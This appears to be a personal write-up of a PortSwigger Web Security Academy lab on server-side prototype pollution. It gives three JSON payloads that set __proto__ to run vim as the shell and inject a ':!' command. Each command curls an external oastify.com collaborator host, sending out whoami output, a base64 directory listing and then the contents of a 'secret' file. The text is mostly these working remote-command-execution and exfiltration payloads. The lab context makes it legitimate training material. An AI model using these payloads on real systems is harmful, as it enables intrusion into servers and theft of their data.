---
{"dg-publish":true,"permalink":"/port-swigger-web-academy/prototype-pollution/server-side-prototype-pollution/lab-9-vim-technique-and-b64/"}
---


---

This lab is similar to Lab 8 but this time the usual `execArgv`  property payload won't work. We will utilize the `vim` this time.

This is the payload:

```json
"__proto__":{
	"shell":"vim",
	"input":":! curl https://gcw2kk6asiji226oj9s90d2zxq3hr9fy.oastify.com -d $(whoami)\n"
}
```

The second catch was, the `stdout` was not showing everything, we only get a certain amount of it. For this, we will encode the output in `base64` in the bash command

```json
"__proto__":{
	"shell":"vim",
	"input":":! curl https://gcw2kk6asiji226oj9s90d2zxq3hr9fy.oastify.com -d $(ls | base64)\n"
}
```

![Pasted image 20250402220545.png](/img/user/Images/Pasted%20image%2020250402220545.png)

Decode it and we found a hidden file `secret`

![Pasted image 20250402220658.png](/img/user/Images/Pasted%20image%2020250402220658.png)\

Now just `cat` it with `base64` and decode it

```json
"__proto__":{
	"shell":"vim",
	"input":":! curl https://gcw2kk6asiji226oj9s90d2zxq3hr9fy.oastify.com -d $(cat secret | base64)\n"
}
```

![Pasted image 20250402221014.png](/img/user/Images/Pasted%20image%2020250402221014.png)
